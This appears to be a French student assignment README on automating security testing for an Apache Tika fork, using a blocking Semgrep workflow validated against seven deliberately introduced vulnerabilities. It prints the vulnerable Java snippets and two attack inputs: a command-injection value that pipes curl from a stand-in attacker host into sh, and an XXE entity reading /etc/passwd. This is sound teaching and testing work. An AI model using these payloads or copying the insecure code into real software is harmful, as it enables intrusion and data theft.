# IFT3913 – Tâche 3 : automatisation des tests de sécurité

| Nom complet | Identifiant GitHub |
|---|---|
| Thierno Diallo | dthierno |
| Andy Luemba Nguema | andy00L |

Ce document couvre les cinq volets de la tâche 3 sur notre fork d'Apache Tika :

1. [Workflow GitHub Actions qui échoue sur toute nouvelle vulnérabilité Semgrep](#1-workflow-github-actions--semgrep-bloquant)
2. [Validation du workflow](#2-validation-du-workflow)
3. [Sept vulnérabilités de types différents introduites dans Tika](#3-vulnérabilités-introduites)
4. [Comparaison des rapports Semgrep avant et après](#4-comparaison-des-rapports-semgrep-avant--après)
5. [Rickroll quand un cas de test échoue](#5-humour--rickroll-quand-un-test-échoue)

| Fichier | Rôle |
|---|---|
| [`.github/workflows/tache3.yml`](../.github/workflows/tache3.yml) | workflow : job `semgrep` (bloquant) et job `tests` (avec rickroll) |
| [`.github/actions/rickroll/action.yml`](../.github/actions/rickroll/action.yml) | action composite réutilisable qui rickrolle le CI |
| [`.github/actions/rickroll/rickroll.py`](../.github/actions/rickroll/rickroll.py) | lecture des rapports Surefire, annotations et résumé du job |
| [`tika-core/src/test/java/org/apache/tika/RickrollDemoTest.java`](../tika-core/src/test/java/org/apache/tika/RickrollDemoTest.java) | test volontairement en échec, désactivé par défaut |
| 7 fichiers Java dans 5 modules | les vulnérabilités V1 à V7 (section 3) |
| [`tache3/resultats/`](resultats/) | rapports Semgrep avant/après au format JSON |

Environnement : Semgrep 1.185.0, OpenJDK 21.0.10, Maven via le wrapper du dépôt (`./mvnw`),
macOS (arm64) pour les essais locaux et `ubuntu-latest` dans GitHub Actions.

---

## 1. Workflow GitHub Actions : Semgrep bloquant

### 1.1 Pourquoi un workflow dédié plutôt que `main jdk17 build`

Le cas d'étude contient déjà plusieurs workflows (`main-jdk17-build.yml`, `main-jdk21-build.yml`, …).
Nous avons d'abord envisagé d'ajouter Semgrep dans `main-jdk17-build.yml`, mais ce workflow est
**déjà rouge sur notre fork avant toute modification** : le module
`tika-pipes-s3-integration-tests` échoue (`S3PipeIntegrationTest.setupMinio` : *Local Docker Compose
exited abnormally*), et une exécution dure 28 à 42 minutes. Une barrière de sécurité greffée sur un
workflow qui échoue déjà pour une autre raison ne donne aucun signal exploitable : on ne saurait pas
si le rouge vient de Semgrep ou de Docker.

Nous avons donc ajouté au cas d'étude le workflow `IFT3913 - Tâche 3` (`.github/workflows/tache3.yml`),
sur le modèle du workflow de la tâche 2. Il est déclenché sur `push` (branches `main` et `tache3/**`),
sur `pull_request` vers `main` et à la main (`workflow_dispatch`). Il contient deux jobs indépendants :

| Job | Rôle | Fait échouer le workflow si… |
|---|---|---|
| `semgrep` | analyse différentielle Semgrep | le commit (ou le push, ou la PR) introduit au moins un nouveau constat |
| `tests` | compile et teste les 5 modules du cas d'étude, rickroll en cas d'échec | un cas de test échoue |

Les deux jobs tournent en parallèle : un constat Semgrep marque l'exécution en échec ❌ sans priver
l'équipe du résultat des tests, et inversement.

### 1.2 Choix de conception

**Analyse différentielle (`--baseline-commit`).** L'énoncé demande d'échouer quand un commit introduit
une *nouvelle* vulnérabilité. Or Tika contient déjà 19 constats Semgrep (section 4). Un simple
`semgrep scan --error` échouerait à chaque commit, y compris un commit qui ne touche qu'un README :
la barrière serait inutilisable. Avec `--baseline-commit <sha>`, Semgrep analyse les fichiers modifiés
depuis `<sha>`, les compare à leur version dans `<sha>` et ne rapporte que les constats qui n'existaient
pas dans la référence. Avec `--error`, le code de sortie vaut 1 dès qu'il reste un constat nouveau, ce
qui fait échouer l'étape, puis le job, puis l'exécution du workflow.

**Choix du commit de référence**, selon l'événement (étape « Déterminer le commit de référence ») :

| Événement | Référence | Justification |
|---|---|---|
| `pull_request` | `git merge-base <base de la PR> HEAD` | tout ce que la PR ajoute à la branche cible, sans compter les commits arrivés entre-temps sur `main` |
| `push` | `github.event.before` | tout ce que le push ajoute à l'état précédent de la branche, même s'il contient plusieurs commits |
| nouvelle branche (`before` = `000…0`), force-push (`before` introuvable), `workflow_dispatch` | `HEAD~1` | il n'y a pas d'état précédent fiable ; on évalue le dernier commit |

`actions/checkout` est configuré avec `fetch-depth: 0`, car Semgrep doit pouvoir extraire le commit de
référence de l'historique Git.

**Règles.** Nous utilisons deux ensembles du registre Semgrep : `p/java` et `p/security-audit`.
`p/java` seul ne contient pas certaines règles dont nous avions besoin
(`object-deserialization`, `command-injection-formatted-runtime-call`,
`overly-permissive-file-permission`, `weak-random`) ; `p/security-audit` couvre en plus les fichiers
Python, YAML et HTML du dépôt. La version de Semgrep est **fixée** (`1.185.0`) pour que le moteur ne
change pas d'une exécution à l'autre. Les règles du registre, elles, peuvent évoluer. C'est un compromis
assumé : on profite des correctifs de règles sans maintenance. Pour un résultat totalement reproductible,
il faudrait copier les règles dans le dépôt (`--config .semgrep/`).

**Portée.** Tout le dépôt est analysé, pas seulement les cinq modules du cas d'étude : une
vulnérabilité ajoutée ailleurs doit aussi bloquer. L'analyse différentielle ne relit que les fichiers
modifiés, donc le coût reste faible. Les répertoires de tests sont exclus par le `.semgrepignore` par
défaut de Semgrep : un mot de passe de test ou un parseur XML de test ne bloquent pas le build.

**Sévérité.** Toutes les sévérités (`INFO`, `WARNING`, `ERROR`) bloquent. Comme seuls les constats
*nouveaux* comptent, ce choix strict ne pénalise pas l'existant : il force seulement à justifier toute
nouvelle exception.

**Exceptions justifiées.** Un faux positif se traite avec un commentaire
`// nosemgrep: <id-de-règle>` accompagné d'une justification, ce qui laisse une trace dans la revue de
code. Nous l'avons utilisé une fois (section 2.2).

**`semgrep scan` plutôt que `semgrep ci`.** `semgrep ci` fait aussi de l'analyse différentielle, mais il
est conçu pour la plateforme Semgrep AppSec (jeton `SEMGREP_APP_TOKEN`, politiques gérées en ligne).
`semgrep scan --baseline-commit` fonctionne sans compte ni secret, et la logique de blocage reste
entièrement visible dans le dépôt.

**Rapports.** En plus de l'analyse bloquante, le job produit un rapport complet du dépôt (JSON et SARIF,
informatif, ne bloque pas). Les rapports sont publiés comme artefact `semgrep-reports`, et un tableau
des nouveaux constats est écrit dans le résumé du job (`$GITHUB_STEP_SUMMARY`). Les rapports sont écrits
dans `$RUNNER_TEMP`, hors du dépôt, pour ne pas salir l'arbre de travail que `--baseline-commit` compare.

**Sécurité du workflow lui-même.** Permissions minimales (`contents: read`). Les valeurs venant de
l'événement (`github.event.before`, SHA de la PR) passent par des variables d'environnement plutôt que
par `${{ }}` dans les scripts, comme le recommande le guide de durcissement de GitHub Actions contre
l'injection de commandes dans les workflows. Un groupe `concurrency` annule les exécutions devenues
obsolètes sur une même branche.

---

## 2. Validation du workflow

### 2.1 Validation statique

`actionlint` 1.7.12 sur `.github/workflows/tache3.yml` : aucune erreur.

### 2.2 Simulation locale de la barrière Semgrep

Nous avons rejoué le job `semgrep` sur une **copie jetable** du dépôt (`git clone` local). Chaque
scénario est un commit, analysé avec exactement la commande du workflow
(`semgrep scan --config p/java --config p/security-audit --baseline-commit HEAD~1 --error`) :

| # | Commit | Code de sortie | Nouveaux constats | Résultat attendu |
|---|---|---|---|---|
| 1 | ajout du workflow, de l'action rickroll et du test de démonstration | 0 | 0 | ✅ passe |
| 2 | ajout des 7 vulnérabilités (section 3) | **1** | **9** | ❌ bloque |
| 3 | commit de documentation seulement (vulnérabilités déjà présentes dans la référence) | 0 | 0 | ✅ passe : l'existant ne bloque pas |
| 4 | modification anodine d'un fichier qui contient déjà une vulnérabilité (`TikaInputStream.java`) | 0 | 0 | ✅ passe : un fichier modifié n'est pas réanalysé en entier |
| 5 | ajout d'un `MessageDigest.getInstance("SHA-1")` dans `PDFParser.java`, déjà vulnérable | **1** | **1** (`use-of-sha1`) | ❌ bloque : seul le nouveau constat est rapporté |

La première exécution du scénario 1 a d'ailleurs **échoué** : la barrière a détecté dans notre propre
script `rickroll.py` l'usage de `xml.etree.ElementTree` (`python.lang.security.use-defused-xml`). Nous
l'avons traité comme une exception justifiée (`# nosemgrep`) : le XML lu provient des rapports Surefire
produits par notre propre build dans le même job, pas d'un tiers, et expat (Python ≥ 3.7.1) ne résout
pas les entités externes. Après ce changement, le scénario 1 passe.

Nous avons aussi exécuté localement les scripts des étapes « Déterminer le commit de référence » et
« Résumé Semgrep », extraits tels quels du YAML, avec des variables d'environnement simulées :

| Événement simulé | Valeur fournie | Référence choisie |
|---|---|---|
| `push` | `before = 0000…0000` (nouvelle branche) | `HEAD~1` |
| `push` | `before = HEAD~3` (push de 3 commits) | `HEAD~3` |
| `push` | `before` = SHA inexistant (force-push) | `HEAD~1` |
| `pull_request` | base = `HEAD~3` | `HEAD~3` (merge-base) |
| `workflow_dispatch` | — | `HEAD~1` |

Pour un push de 3 commits dont le dernier ajoute SHA-1, l'étape différentielle sort avec le code 1 et le
résumé contient une ligne `use-of-sha1 | WARNING | …/PDFParser.java | 612`.

### 2.3 Les vulnérabilités ne cassent pas la suite de tests

Avec les 7 vulnérabilités en place, la suite de tests des cinq modules passe intégralement
(`./mvnw -pl <5 modules> test -Dspotless.goal=check`) : checkstyle, spotless et forbiddenapis
passent aussi.

| Module | Tests | Échecs | Ignorés |
|---|---|---|---|
| tika-core | 757 | 0 | 2 |
| tika-serialization | 216 | 0 | 2 |
| tika-parser-ocr-module | 30 | 0 | 2 |
| tika-parser-microsoft-module | 506 | 0 | 14 |
| tika-parser-pdf-module | 88 | 0 | 1 |

Ce résultat justifie l'analyse statique : 1 597 tests verts n'ont détecté aucune des sept failles.
Seul Semgrep fait échouer le commit qui les introduit.

### 2.4 Validation sur GitHub

Les commits ont été poussés **un par un**, dans l'ordre prévu pour que chaque exécution corresponde
à un seul commit :

| Commit | Auteur | Contenu | Résultat attendu (job `semgrep` / job `tests`) |
|---|---|---|---|
| `a0168aafa` | Thierno Diallo | workflow, action rickroll, test de démonstration | ✅ / ✅ |
| `c6a8bef8d` | Andy Luemba Nguema | 7 vulnérabilités | ❌ 9 nouveaux constats / ✅ |
| (ce commit) | Thierno Diallo | documentation, rapports Semgrep, exclusions RAT | ✅ / ✅ |

**Limite rencontrée :** au moment des pushes (17 novembre 2026), GitHub n'a déclenché **aucune**
exécution sur notre fork, ni pour notre workflow ni pour les workflows d'origine de Tika
(`main jdk17 build`, etc.), alors qu'ils s'exécutaient normalement en octobre pour la tâche 2. Le
déclenchement manuel (`gh workflow run tache3.yml`) est refusé avec
`HTTP 422: Actions has been disabled for this repository`, bien que les paramètres du dépôt
indiquent `enabled: true`. Il s'agit donc d'une restriction imposée par GitHub sur le dépôt, que nous
ne pouvons pas lever nous-mêmes.

La validation du workflow repose donc sur la validation statique (2.1), sur la simulation locale de
la barrière avec exactement les commandes du workflow (2.2), sur l'exécution locale des scripts des
étapes avec des variables d'environnement GitHub simulées (2.2) et sur l'exécution des tests (2.3).
Pour rejouer la démonstration sur GitHub dès qu'Actions est disponible :

1. pousser une branche `tache3/demo-vulns` pointant sur `c6a8bef8d` : le job `semgrep` échoue avec
   9 nouveaux constats (référence `HEAD~1` = `a0168aafa`) ;
2. lancer « IFT3913 - Tâche 3 » à la main sur `main` avec `rickroll_demo` coché : le job `tests`
   échoue sur `RickrollDemoTest` et l'étape « Never gonna let you down » produit le rickroll.

---

## 3. Vulnérabilités introduites

Chaque vulnérabilité est marquée dans le code par un commentaire `IFT3913 tache 3 - vulnerabilite Vn`.
Nous avons choisi sept faiblesses de **sept CWE différentes**, réparties dans les **cinq modules** du cas
d'étude. Chacune s'appuie sur une fonctionnalité plausible pour Tika (télécharger un document en HTTPS,
lire des fichiers temporaires, journaliser, relire un cache…), plutôt que sur du code mort.

| # | CWE | Catégorie OWASP 2021 | Module / fichier | Règle Semgrep | Sévérité |
|---|---|---|---|---|---|
| V1 | CWE-78 injection de commande OS | A03 Injection | ocr / `TesseractOCRParser.java:736` | `command-injection-formatted-runtime-call` | ERROR |
| V2 | CWE-276 permissions par défaut incorrectes | A01 Broken Access Control | core / `TemporaryResources.java:97` | `overly-permissive-file-permission` | WARNING |
| V3 | CWE-295 validation de certificat incorrecte | A07 Identification and Authentication Failures | core / `TikaInputStream.java:221-229` | `insecure-trust-manager` (×3) | WARNING |
| V4 | CWE-328 hachage faible | A02 Cryptographic Failures | pdf / `PDFParser.java:611` | `use-of-md5` | WARNING |
| V5 | CWE-611 entités externes XML (XXE) | A05 Security Misconfiguration | microsoft / `XSSFCommentsShim.java:89` | `saxparserfactory-disallow-doctype-decl-missing` | ERROR |
| V6 | CWE-502 désérialisation de données non fiables | A08 Software and Data Integrity Failures | serialization / `JsonMetadataList.java:156` | `object-deserialization` | WARNING |
| V7 | CWE-327 algorithme cryptographique risqué (AES/ECB) | A02 Cryptographic Failures | core / `CryptoParser.java:83` | `use-of-aes-ecb` | WARNING |

### V1 – Injection de commande OS (CWE-78) : `TesseractOCRParser.preloadLangs()`

**Fichier.** `tika-parser-ocr-module/.../parser/ocr/TesseractOCRParser.java`. Le module OCR est le seul
du cas d'étude qui lance un programme externe (`tesseract`), c'est donc l'endroit naturel pour une
injection de commande.

**Modification.** La méthode qui précharge la liste des langues construisait un `ProcessBuilder` avec un
tableau d'arguments, sans shell. Nous la remplaçons par une chaîne concaténée confiée à `sh -c` :

```java
String command = defaultConfig.getTesseractPath() + getTesseractProg() + " --list-langs";
...
process = java.lang.Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
```

**Pourquoi c'est vulnérable.** `tesseractPath` vient de la configuration (fichier de configuration
Tika, ou configuration par requête quand Tika tourne en serveur). Avec `ProcessBuilder(String[])`, cette
valeur n'était qu'un chemin d'exécutable. Avec `sh -c`, elle est interprétée par un shell : une valeur
comme `/usr/bin/; curl http://attaquant/x | sh; ` exécute des commandes arbitraires avec les droits du
processus Tika.

**Résultat Semgrep.** `java.lang.security.audit.command-injection-formatted-runtime-call` (ERROR,
ligne 736) : *« A formatted or concatenated string was detected as input to a java.lang.Runtime call…
could result in a command injection. »*

**Observation : faux négatif de Semgrep.** Notre première version utilisait `Runtime.getRuntime()`
(sans qualification), ce qui est l'écriture habituelle en Java, et **Semgrep ne la détectait pas**.
Des essais sur un fichier minimal montrent que la règle n'accepte que `java.lang.Runtime.getRuntime()`
pleinement qualifié ou une variable déclarée de type `java.lang.Runtime` : l'import implicite de
`java.lang` n'est pas résolu. Nous avons gardé la forme qualifiée pour que la faille soit détectée,
mais cette observation montre la limite d'une barrière fondée uniquement sur des motifs syntaxiques :
la même faille écrite de façon idiomatique serait passée.

### V2 – Permissions trop larges sur les fichiers temporaires (CWE-276) : `TemporaryResources.createTempFile()`

**Fichier.** `tika-core/.../io/TemporaryResources.java`. Tous les parseurs qui ont besoin d'un fichier
sur disque passent par cette méthode : PDF mis en cache, image envoyée à Tesseract, pièce jointe extraite,
etc. Elle concentre donc des copies de documents potentiellement confidentiels.

**Modification.**

```java
if (FileSystems.getDefault().supportedFileAttributeViews().contains("posix")) {
    Files.setPosixFilePermissions(path, PosixFilePermissions.fromString("rw-rw-rw-"));
}
```

**Pourquoi c'est vulnérable.** `Files.createTempFile` crée le fichier en `rw-------` (propriétaire
seulement). Le passer en `rw-rw-rw-` permet à tout utilisateur local de **lire** une copie du document
analysé (fuite d'information) et de la **modifier** entre son écriture et sa relecture par Tika
(empoisonnement de l'entrée d'un outil externe comme Tesseract). Sur un serveur partagé, c'est une fuite
de données d'un utilisateur à l'autre. La condition `posix` rend la faille silencieuse sous Windows : le
code ne plante nulle part, ce qui la rend encore plus difficile à remarquer.

**Résultat Semgrep.** `java.lang.security.audit.overly-permissive-file-permission` (WARNING, ligne 97) :
*« Detected file permissions that are overly permissive… can lead to privilege escalation or information
leakage. »*

### V3 – Certificats TLS acceptés sans validation (CWE-295) : `TikaInputStream.get(URL, Metadata)`

**Fichier.** `tika-core/.../io/TikaInputStream.java`. `TikaInputStream.get(URL)` est le point d'entrée
pour analyser un document distant (`tika-app` avec une URL, `NetworkParser`, etc.).

**Modification.** Pour toute connexion `HttpsURLConnection`, on installe une fabrique de sockets dont le
`X509TrustManager` ne vérifie rien : `checkClientTrusted` et `checkServerTrusted` sont vides et
`getAcceptedIssuers` renvoie `null`. C'est le « contournement » classique pour « accepter les certificats
auto-signés de l'intranet ».

**Pourquoi c'est vulnérable.** HTTPS n'apporte plus aucune authentification du serveur : un attaquant
en position d'intermédiaire (Wi-Fi public, DNS empoisonné, proxy compromis) présente n'importe quel
certificat et sert à Tika le document de son choix. Il peut par exemple fournir un fichier forgé pour
exploiter un autre parseur, ou lire les documents téléchargés. Le canal reste chiffré, mais avec
l'attaquant.

**Résultat Semgrep.** `java.lang.security.audit.crypto.ssl.insecure-trust-manager` (WARNING), **trois
constats** (lignes 221, 225 et 229), un par méthode vide ou permissive du gestionnaire de confiance :
*« Detected empty trust manager implementations… enabling man-in-the-middle attacks. »* Remarque : nous
avions d'abord écrit `SSLContext.getInstance("TLS")`, ce qui déclenchait en plus `weak-ssl-context`.
Nous avons choisi `"TLSv1.3"` pour que la faille soit uniquement la validation des certificats et que
chaque vulnérabilité corresponde à un seul type de constat.

### V4 – Hachage faible d'un mot de passe (CWE-328) : `PDFParser.getPassword()`

**Fichier.** `tika-parser-pdf-module/.../parser/pdf/PDFParser.java`. Le parseur PDF est le seul du cas
d'étude qui manipule directement un mot de passe utilisateur (PDF chiffrés, via `PasswordProvider`).

**Modification.** Pour « faciliter le débogage », le mot de passe fourni est journalisé sous forme
d'empreinte MD5 :

```java
LOG.debug("Opening PDF with password fingerprint {}", passwordFingerprint(password));
...
MessageDigest md = MessageDigest.getInstance("MD5");
```

**Pourquoi c'est vulnérable.** MD5 est cassé (collisions) et surtout extrêmement **rapide** : un GPU
teste des milliards de candidats par seconde, et une empreinte MD5 sans sel se retrouve dans des tables
précalculées. Écrire cette empreinte dans des journaux souvent moins protégés que les documents revient
à publier le mot de passe du PDF. Pour une empreinte de mot de passe, il faudrait au minimum un
algorithme lent et salé (PBKDF2, bcrypt, Argon2), et idéalement ne rien journaliser.

**Résultat Semgrep.** `java.lang.security.audit.crypto.use-of-md5` (WARNING, ligne 611) : *« Detected
MD5 hash algorithm which is considered insecure… »*. La règle propose même une correction automatique
(`"SHA-512"`).

### V5 – XXE dans les commentaires de classeurs Excel (CWE-611) : `XSSFCommentsShim`

**Fichier.** `tika-parser-microsoft-module/.../parser/microsoft/ooxml/XSSFCommentsShim.java`. Un
`.xlsx` est une archive ZIP de fichiers XML entièrement contrôlés par l'auteur du document : c'est
l'endroit typique où une XXE devient exploitable à distance, puisqu'il suffit de soumettre un classeur à
Tika.

**Modification.** Le constructeur passait par `XMLReaderUtils.parseSAX(...)`, qui configure un parseur
durci (DTD interdites, entités externes désactivées, `SecurityManager` Xerces). Nous créons à la place un
`SAXParserFactory.newInstance()` par défaut :

```java
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setNamespaceAware(true);
SAXParser parser = factory.newSAXParser();
parser.parse(is, handler);
```

**Pourquoi c'est vulnérable.** Le parseur par défaut accepte un `DOCTYPE` et résout les entités
externes. Un `xl/comments1.xml` contenant
`<!DOCTYPE c [<!ENTITY x SYSTEM "file:///etc/passwd">]>` et `&x;` dans le texte d'un commentaire fait
lire un fichier local, dont le contenu ressort dans le texte extrait par Tika. Une URL `http://` interne
donne une SSRF, et des entités imbriquées (« billion laughs ») un déni de service. Les tests existants
passent toujours, car les classeurs de test légitimes n'ont pas de DTD.

**Résultat Semgrep.** `java.lang.security.audit.xxe.saxparserfactory-disallow-doctype-decl-missing`
(ERROR, ligne 89) : *« DOCTYPE declarations are enabled for this SAXParserFactory. This is vulnerable to
XML external entity attacks. »*

### V6 – Désérialisation Java non fiable (CWE-502) : `JsonMetadataList.fromJavaSerialized()`

**Fichier.** `tika-serialization/.../serialization/JsonMetadataList.java`. Le module de sérialisation
convertit les listes de `Metadata` (une par document et pièce jointe) vers et depuis JSON. `Metadata`
implémente `Serializable`, d'où la tentation d'ajouter une lecture « compatible avec d'anciens caches ».

**Modification.** Nouvelle méthode publique :

```java
public static List<Metadata> fromJavaSerialized(InputStream stream) throws IOException {
    ObjectInputStream ois = new ObjectInputStream(stream);
    return (List<Metadata>) ois.readObject();
}
```

**Pourquoi c'est vulnérable.** `readObject()` instancie **n'importe quelle** classe sérialisable du
classpath et exécute ses méthodes `readObject`/`readResolve` *avant* le transtypage en
`List<Metadata>`. Le classpath de Tika est très large (Commons, POI, PDFBox, Jackson…). Un flux forgé
(chaîne de « gadgets » du type ysoserial) peut donc exécuter du code à distance, ou épuiser la mémoire
avec des collections imbriquées. Le JSON lu par `fromJson` ne pose pas ce problème : il ne construit
que des `Metadata`.

**Résultat Semgrep.** `java.lang.security.audit.object-deserialization` (WARNING, ligne 156) : *« Found
object deserialization using ObjectInputStream… Ensure that the objects being deserialized are not
user-controlled. »*

### V7 – Repli silencieux sur AES/ECB (CWE-327) : `CryptoParser.parse()`

**Fichier.** `tika-core/.../parser/CryptoParser.java`. C'est le parseur générique de Tika qui déchiffre
un flux avant de le confier au parseur suivant ; le choix de l'algorithme y est central.

**Modification.** Si aucune transformation n'est configurée, au lieu d'échouer, le parseur se rabat sur
une valeur « par défaut » :

```java
if (StringUtils.isBlank(transformation)) {
    cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
}
```

**Pourquoi c'est vulnérable.** ECB chiffre chaque bloc de 16 octets indépendamment, sans vecteur
d'initialisation : deux blocs identiques donnent deux chiffrés identiques. La structure du document
fuit (l'exemple classique est l'image du pingouin chiffrée en ECB, qui reste reconnaissable). Sans
intégrité, un attaquant peut aussi **réordonner, supprimer ou rejouer** des blocs sans être détecté.
Un repli silencieux est pire qu'une erreur : les producteurs de documents finissent par s'aligner sur ce
mode faible sans le savoir. Il faudrait exiger une transformation explicite, ou utiliser un mode
authentifié (AES/GCM).

**Résultat Semgrep.** `java.lang.security.audit.crypto.use-of-aes-ecb` (WARNING, ligne 83) : *« Use of
AES with ECB mode detected. ECB doesn't provide message confidentiality and is not semantically
secure… »*

---

## 4. Comparaison des rapports Semgrep avant / après

Les deux analyses utilisent la même commande et les mêmes règles
(`semgrep scan --config p/java --config p/security-audit`, Semgrep 1.185.0). « Avant » est le commit
`48bf35599` (fin de la tâche 2). « Après » est le même code avec les sept vulnérabilités. Les rapports
JSON (réduits aux constats) sont dans [`tache3/resultats/`](resultats/).

| Portée | Avant | Après | Nouveaux | Rapports |
|---|---|---|---|---|
| 5 modules du cas d'étude (699 fichiers, 89 règles appliquées) | 3 | 12 | **9** | `semgrep-avant-modules.json`, `semgrep-apres-modules.json` |
| dépôt complet | 19 | 28 | **9** | `semgrep-avant-depot.json`, `semgrep-apres-depot.json` |
| analyse différentielle (`--baseline-commit`) | – | – | **9** | `semgrep-nouveaux-constats.json` |

**Constats déjà présents dans les 5 modules (inchangés après nos modifications) :**

| Règle | Fichier | Ligne |
|---|---|---|
| `saxparserfactory-disallow-doctype-decl-missing` | `tika-core/.../mime/MimeTypesReader.java` | 223 |
| `unencrypted-socket` | `tika-core/.../parser/NetworkParser.java` | 68 |
| `xmlinputfactory-possible-xxe` | `tika-core/.../utils/XMLReaderUtils.java` | 307 |

Ces trois constats préexistants ressemblent à des faux positifs ou à des choix assumés par Tika.
`MimeTypesReader` active `FEATURE_SECURE_PROCESSING` et ne lit que les définitions de types MIME
(`tika-mimetypes.xml`, `custom-mimetypes.xml`), pas les documents analysés. `XMLReaderUtils` désactive
bien `SUPPORT_DTD` et `IS_SUPPORTING_EXTERNAL_ENTITIES`, mais par une méthode utilitaire
(`tryToSetStaxProperty`) que la règle ne sait pas suivre. `NetworkParser` gère volontairement le schéma
`telnet://`, qui n'a pas de variante chiffrée.
L'analyse différentielle les ignore, et c'est précisément ce qui la rend utilisable.

**Constats nouveaux (identiques dans les trois comparaisons) :**

| Vuln. | Règle | Fichier | Ligne |
|---|---|---|---|
| V1 | `command-injection-formatted-runtime-call` | `TesseractOCRParser.java` | 736 |
| V2 | `overly-permissive-file-permission` | `TemporaryResources.java` | 97 |
| V3 | `insecure-trust-manager` | `TikaInputStream.java` | 221 |
| V3 | `insecure-trust-manager` | `TikaInputStream.java` | 225 |
| V3 | `insecure-trust-manager` | `TikaInputStream.java` | 229 |
| V4 | `use-of-md5` | `PDFParser.java` | 611 |
| V5 | `saxparserfactory-disallow-doctype-decl-missing` | `XSSFCommentsShim.java` | 89 |
| V6 | `object-deserialization` | `JsonMetadataList.java` | 156 |
| V7 | `use-of-aes-ecb` | `CryptoParser.java` | 83 |

Les sept vulnérabilités sont toutes détectées : 9 constats, puisque V3 en produit trois. La comparaison
« dépôt complet » (19 → 28) donne exactement les mêmes 9 constats que l'analyse différentielle, ce qui
recoupe le fonctionnement de `--baseline-commit` : il ne remonte ni faux « nouveau » constat ni constat
manquant. Les 16 autres constats préexistants du dépôt sont hors du cas d'étude (`tika-pipes`,
`tika-eval`, `docs/`, scripts Python), par exemple `formatted-sql-string` dans `tika-eval` et
`insecure-hostname-verifier` dans `tika-httpclient-commons`.

---

## 5. Humour : rickroll quand un test échoue

### 5.1 Implémentation

Nous avons écrit notre propre **action composite réutilisable**,
[`.github/actions/rickroll`](../.github/actions/rickroll/action.yml), plutôt que de reprendre
[`random-rickroll`](https://github.com/TejasvOnly/random-rickroll), pour trois raisons :

- `random-rickroll` déclare `using: 'node12'`, un environnement d'exécution que GitHub a déprécié
  depuis 2022 et ne maintient plus ;
- elle rickrolle au hasard (un pourcentage) via un commentaire de PR, alors que l'énoncé demande un
  rickroll **quand un test échoue**, y compris sur un `push` où il n'y a pas de PR à commenter ;
- commenter une PR exige `pull-requests: write`, une permission que nous préférons ne pas accorder
  (moindre privilège), et que GitHub refuse de toute façon aux PR venant de forks.

L'action est composite (`using: composite`) et appelle un script Python sans dépendance
([`rickroll.py`](../.github/actions/rickroll/rickroll.py)). Celui-ci :

1. lit les rapports JUnit XML de Surefire (`**/target/surefire-reports/TEST-*.xml`, paramétrable avec
   `reports`) et relève chaque `<testcase>` en `failure` ou en `error` ;
2. affiche une bannière ASCII « Never gonna… fail you up? » dans le journal ;
3. crée une **annotation d'erreur** par test en échec, avec le nom du test, son message, un couplet
   parodique (en français, écrit par nous) et le lien vers la vidéo. Les annotations apparaissent sur la
   page de l'exécution et dans l'onglet *Checks* des PR ;
4. écrit dans le **résumé du job** une miniature cliquable de la vidéo (« Cliquez ici pour voir pourquoi
   le test a échoué ») et un tableau des tests qui « vous ont laissé tomber » ;
5. expose le nombre de tests en échec dans la sortie `failed-tests`.

Dans le workflow, l'action est appelée juste après l'étape de tests :

```yaml
- name: Exécuter les tests du cas d'étude
  id: tests
  run: ./mvnw -B -ntp -pl "$CASE_STUDY_MODULES" test ...

- name: Never gonna let you down
  if: failure() && steps.tests.outcome == 'failure'
  uses: ./.github/actions/rickroll
```

La condition `steps.tests.outcome == 'failure'` limite le rickroll aux échecs de **tests**. Une erreur
de compilation des dépendances, à l'étape précédente, ne déclenche pas de rickroll. Comme l'action vit
dans son propre répertoire avec un `action.yml`, d'autres dépôts peuvent la réutiliser avec
`uses: dthierno/tika/.github/actions/rickroll@main`.

### 5.2 Démonstration sans casser Tika

Pour démontrer le rickroll sans introduire un vrai test rouge dans Tika, nous avons ajouté
[`RickrollDemoTest`](../tika-core/src/test/java/org/apache/tika/RickrollDemoTest.java). Ce test est
désactivé par défaut (`@EnabledIfSystemProperty(named = "tika.rickroll.demo", matches = "true")`) et
échoue volontairement quand on l'active :

```java
assertEquals("never gonna give you up", "gonna give you up",
        "Ce test vous a laissé tomber. Rick, lui, ne l'aurait jamais fait.");
```

Le workflow expose la case à cocher `rickroll_demo` (onglet *Actions*, *Run workflow*), qui passe
`-Dtika.rickroll.demo=true` à Maven.

**Validation locale :**

| Commande | Résultat |
|---|---|
| `./mvnw -pl tika-core test -Dtest='RickrollDemoTest,ZeroSizeFileDetector*' -Dtika.rickroll.demo=false` | `RickrollDemoTest` ignoré, BUILD SUCCESS |
| même commande avec `-Dtika.rickroll.demo=true` | `neverGonnaGiveYouUp:39 … expected: <never gonna give you up> but was: <gonna give you up>`, BUILD FAILURE |
| `python3 .github/actions/rickroll/rickroll.py` sur les rapports produits | bannière, 1 annotation `::error title=Never gonna let you down::org.apache.tika.RickrollDemoTest.neverGonnaGiveYouUp …`, résumé Markdown, `failed-tests=1` |

---

## 6. Reproduire localement

```bash
# Semgrep (dans un environnement virtuel Python)
python3 -m venv .venv && .venv/bin/pip install semgrep==1.185.0

# Rapport complet
.venv/bin/semgrep scan --config p/java --config p/security-audit --metrics=off

# Barrière : uniquement les constats introduits depuis un commit
.venv/bin/semgrep scan --config p/java --config p/security-audit --metrics=off \
  --baseline-commit 48bf35599 --error

# Tests des 5 modules (après un premier « install -DskipTests » avec -am)
M=tika-parsers/tika-parsers-standard/tika-parsers-standard-modules
./mvnw -B -pl tika-core,tika-serialization,$M/tika-parser-pdf-module,$M/tika-parser-ocr-module,$M/tika-parser-microsoft-module \
  test -Dspotless.goal=check -Djacoco.skip=true

# Démonstration du rickroll
./mvnw -B -pl tika-core test -Dtest=RickrollDemoTest -Dtika.rickroll.demo=true
```

---

## 7. Utilisation de l'intelligence artificielle

<!-- À RELIRE ET ADAPTER PAR L'ÉQUIPE avant la remise. -->

Conformément aux consignes de l'Université de Montréal, nous déclarons avoir utilisé un outil d'IA
générative : **Claude Code** (Anthropic, modèle Claude Opus 5.5), en novembre 2026. Il nous a aidés à :

- lire l'énoncé et repérer dans Tika des emplacements réalistes pour chaque vulnérabilité ;
- rédiger une première version du workflow `tache3.yml`, de l'action rickroll et du test de
  démonstration ;
- écrire les scripts de simulation locale de la barrière Semgrep (section 2.2) ;
- rédiger une première version de ce README.

Nous avons relu, exécuté et vérifié chaque élément : compilation et tests Maven, analyses Semgrep,
simulation de la barrière, `actionlint`. Nous avons aussi validé les explications des vulnérabilités.
